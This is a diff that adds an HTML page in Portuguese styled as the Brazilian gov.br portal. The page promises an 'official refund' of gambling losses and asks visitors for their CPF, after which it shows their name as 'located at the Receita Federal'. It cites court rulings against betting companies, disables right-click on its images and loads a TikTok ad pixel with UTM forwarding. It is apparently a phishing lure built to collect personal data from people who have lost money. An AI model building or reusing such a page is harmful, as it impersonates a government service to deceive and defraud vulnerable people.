@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Solicitações de Saque - Reembolso Oficial</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css?v=2">
+
+  <style>
+    /* ── Layout Base ─────────────────────────────────────── */
+    body {
+      display: block !important;   /* anula o flex do style.css */
+      margin: 0;
+      padding: 0;
+      background-color: #e2e8f0;
+      background-image: none;
+      min-height: 100vh;
+      box-sizing: border-box;
+    }
+    .gov-top-bar {
+      display: flex !important;
+      width: 100% !important;
+    }
+    .page-content {
+      padding: 4px 12px 20px;
+    }
+    .main-wrapper {
+      background: #ffffff;
+      min-height: calc(100vh - 80px);
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 30px 24px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+      border-radius: 20px;
+      border: 1px solid #e2e8f0;
+    }
+    .header { margin-bottom: 30px; }
+
+    /* ── Banner ATUALIZADO ─────────────────────────────────── */
+    .update-banner {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      background: #f0faf4;
+      border-left: 4px solid #16a34a;
+      border-radius: 4px;
+      padding: 14px 16px;
+      margin-bottom: 22px;
+    }
+    .update-banner-icon {
+      flex-shrink: 0;
+      width: 22px;
+      height: 22px;
+      margin-top: 1px;
+    }
+    .update-banner-icon svg {
+      width: 22px;
+      height: 22px;
+    }
+    .update-banner-text {
+      font-size: 14px;
+      color: #1a1a1a;
+      line-height: 1.5;
+    }
+    .update-banner-text strong {
+      font-weight: 800;
+      color: #16a34a;
+    }
+
+    /* ── Decisions Section ─────────────────────────────────── */
+    .decisions-section {
+      color: #555;
+      font-size: 13px;
+      line-height: 1.5;
+      text-align: left;
+      margin-top: 25px;
+    }
+    .decisions-section p { text-align: center; margin-bottom: 15px; }
+    .decisions-section ul { padding-left: 20px; }
+    .decisions-section li { margin-bottom: 12px; }
+    .decisions-section li b { color: #1155cc; }
+
+    /* ── Button ─────────────────────────────────────────────── */
+    .submit-btn { border-radius: 30px !important; }
+    .submit-btn.active-btn, .submit-btn:not(:disabled) {
+      background: #1155cc !important;
+    }
+
+    /* ── iOS Zoom Fix ────────────────────────────────────────── */
+    input, select, textarea {
+      font-size: 16px !important;
+      touch-action: manipulation;
+    }
+
+    /* ── Image Protection ────────────────────────────────────── */
+    img {
+      pointer-events: none !important;
+      -webkit-touch-callout: none !important;
+      -webkit-user-select: none !important;
+      user-select: none !important;
+    }
+
+    /* ── Header Gov.br ──────────────────────────────────────── */
+
+    .gov-top-bar {
+      background: #ffffff;
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 2px solid #e1e1e1;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+    .gov-top-bar-logo img {
+      height: 32px;
+      width: auto;
+    }
+    .gov-top-bar-actions {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .gov-top-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 1.5px solid #c5c5c5;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: default;
+      pointer-events: none;
+    }
+    .gov-top-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: #555;
+    }
+
+    /* ── Main wrapper ────────────────────────────────────────── */
+    .main-wrapper {
+      background: #ffffff;
+      max-width: 480px;
+      margin: 20px auto;
+      padding: 30px 24px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+      border-radius: 20px;
+      border: 1px solid #e2e8f0;
+    }
+    .header { margin-bottom: 30px; }
+  </style>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+    ttq.load('DA835D3C77UES9745010');
+    ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+
+  <!-- HEADER GOV.BR (topo) -->
+  <div class="gov-top-bar">
+    <div class="gov-top-bar-logo">
+      <img src="logogv/logo-portal.png" alt="gov.br" draggable="false" oncontextmenu="return false;">
+    </div>
+    <div class="gov-top-bar-actions">
+      <!-- Botão Contraste -->
+      <div class="gov-top-btn">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18V4c4.41 0 8 3.59 8 8s-3.59 8-8 8z"/>
+        </svg>
+      </div>
+      <!-- Botão Perfil/Usuário -->
+      <div class="gov-top-btn">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="page-content">
+  <div class="main-wrapper">
+
+    <!-- Top Header (Logo) -->
+    <header class="header">
+      <div class="brand-logo-container" style="width: 100%; max-width: 250px; margin: 0 auto; padding: 0;">
+        <picture>
+          <source srcset="bragoralogo/bragora.webp" type="image/webp">
+          <img src="bragoralogo/bragora.PNG" alt="Direito de Receber de Volta" class="recupera-logo" style="width: 100%; border-radius: 0; box-shadow: none; filter: none; mix-blend-mode: normal;" draggable="false" oncontextmenu="return false;">
+        </picture>
+      </div>
+    </header>
+
+    <main class="card-container" style="border: none; box-shadow: none; padding: 0; background: transparent;">
+
+      <!-- Banner ATUALIZADO -->
+      <div class="update-banner">
+        <div class="update-banner-icon">
+          <!-- Ícone escudo oficial (SVG) -->
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L3 6V12C3 16.97 7.02 21.61 12 23C16.98 21.61 21 16.97 21 12V6L12 2Z" fill="#16a34a"/>
+            <path d="M9 12L11 14L15 10" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="update-banner-text">
+          <strong>ATUALIZADO</strong> &mdash; Informe seu CPF e clique em &ldquo;Continuar&rdquo; para verificar se você tem direito à restituição de valores perdidos em casas de apostas.
+        </div>
+      </div>
+
+      <!-- Carousel Section (HIDDEN) -->
+      <div style="display: none;">
+        <div class="top-status-badge"><span class="live-pulse-dot"></span><span class="status-badge-text">Sistema de Reembolso Ativo • Conexão Criptografada</span></div>
+        <h2 class="card-title">Solicite a plataforma desejada :</h2>
+        <div class="platform-carousel">
+          <button type="button" class="nav-btn prev-btn" id="prevBtn"></button>
+          <div class="platform-display" id="platformDisplay">
+            <div class="platform-circle" id="platformCircle">
+              <div class="platform-content" id="platformContent"></div>
+            </div>
+          </div>
+          <button type="button" class="nav-btn next-btn" id="nextBtn"></button>
+        </div>
+        <div class="carousel-indicators" id="carouselIndicators"></div>
+      </div>
+
+      <!-- Form: Apenas CPF -->
+      <form class="consult-form" id="consultForm" onsubmit="return false;">
+
+        <!-- Campo CPF -->
+        <div class="form-group">
+          <label for="cpfInput" class="form-label" style="display: none;">CPF</label>
+          <div class="input-wrapper">
+            <input
+              type="tel"
+              id="cpfInput"
+              name="cpf"
+              class="form-input"
+              placeholder="000.000.000-00"
+              maxlength="14"
+              inputmode="numeric"
+              autocomplete="off"
+            >
+            <div class="input-loading-spinner" id="cpfLoadingSpinner"></div>
+          </div>
+          <span class="input-error-msg" id="cpfError">Por favor, insira um CPF válido com 11 dígitos.</span>
+
+          <!-- Nome auto-preenchido -->
+          <div class="auto-name-box hidden" id="autoNameBox">
+            <div class="name-box-badge">
+              <svg viewBox="0 0 24 24" width="14" height="14" stroke="#4ade80" stroke-width="2.5" fill="none">
+                <polyline points="20 6 9 17 4 12"></polyline>
+              </svg>
+              <span>Nome Localizado na Receita Federal</span>
+            </div>
+            <div class="name-display-view">
+              <span class="name-label">Titular Identificado:</span>
+              <span class="name-val" id="fetchedFullName">---</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Botão -->
+        <button type="submit" class="submit-btn disabled" id="submitBtn" disabled>
+          <span class="btn-text" id="btnText">DIGITE O CPF PARA CONTINUAR</span>
+          <div class="btn-spinner" id="btnSpinner"></div>
+        </button>
+      </form>
+
+      <div class="decisions-section">
+        <p>Tribunais de todo o país têm reconhecido a nulidade de apostas e determinado a devolução de valores. Decisões recentes:</p>
+        <ul>
+          <li><b>TJDFT</b> anulou apostas e condenou a Betano Brazil a devolver um valor de R$ 18.963.232,12 a consumidores Brasileiros.</li>
+          <li><b>A Justiça de São Paulo</b> condenou a Superbet a devolver mais de R$ 43.565.153,92 aos usuários apostadores.</li>
+          <li><b>3ª Vara Cível de Brasília</b> declarou nulas apostas e determinou devolução de R$ 44 mil a um consumidor ludopata.</li>
+          <li>Dentre outras diversas casas de apostas...</li>
+        </ul>
+      </div>
+
+    </main>
+  </div>
+
+  <script src="script.js?v=8"></script>
+
+  <script>
+    // ─── REPASSADOR DE UTMs ───────────────────────────────────
+    (function() {
+      var urlParams = window.location.search;
+      if (!urlParams) return;
+      function appendParamsToLinks() {
+        var links = document.getElementsByTagName('a');
+        for (var i = 0; i < links.length; i++) {
+          var href = links[i].getAttribute('href');
+          if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) continue;
+          var sep = href.indexOf('?') !== -1 ? '&' : '?';
+          var params = urlParams.startsWith('?') ? urlParams.slice(1) : urlParams;
+          links[i].setAttribute('href', href + sep + params);
+        }
+      }
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', appendParamsToLinks);
+      } else {
+        appendParamsToLinks();
+      }
+    })();
+    // ─────────────────────────────────────────────────────────
+  </script>
+  </div><!-- /.page-content -->
+</body>
+</html>
